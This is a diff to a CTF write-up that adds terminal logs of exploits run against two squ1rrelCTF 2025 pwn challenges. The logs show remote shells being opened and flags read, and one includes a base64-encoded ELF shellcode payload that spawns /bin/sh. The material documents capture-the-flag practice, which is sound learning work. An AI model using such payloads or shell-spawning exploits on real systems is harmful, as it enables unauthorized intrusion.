@@ -211,6 +211,25 @@ if __name__ == '__main__':
     main()
 ```
 
+### Get flag
+
+```sh
+┌─ [22:50] ❄ alter in /mnt/e/sec/CTFs/2025/squ1relCTF/jail ⚲
+└ ϟ ./exploit.py REMOTE 20.84.72.194
+[+] Opening connection to 20.84.72.194 on port 5001: Done
+88
+[*] Switching to interactive mode
+...
+...
+What did you expect. You're in here for life this is what it looks like for the rest.
+...
+...
+What did you expect. You're in here for life this is what it looks like for the rest.
+$ cat flag*
+squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
+$
+```
+
 ## pwn/Extremely Lame Filters 1
 
 ### Challenge Information
@@ -1528,3 +1547,19 @@ p.interactive()
 ```
 
 **P/s: to avoid confusion about section and segments you can read [here](https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format)**
+
+
+### Get flag
+
+```sh
+┌─ [22:52] ❄ alter in /mnt/e/sec/CTFs/2025/squ1relCTF/ExtremelyLameFilters1
+└ ϟ python3 xpl.py
+[+] Opening connection to 20.84.72.194 on port 5002: Done
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAkwAAAAAAAACTAAAAAAAAAAAQAAAAAAAASDHASLsvYmluL3NoAFNIiedIMfZIMdKwOw8F
+/mnt/e/sec/CTFs/2025/squ1relCTF/ExtremelyLameFilters1/xpl.py:110: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(exploit_b64)
+[*] Switching to interactive mode
+I'm a little fairy and I will trust any ELF that comes by!!
+$ cat flag*
+squ1rrel{you_3x3c'd_me_:(}
+```
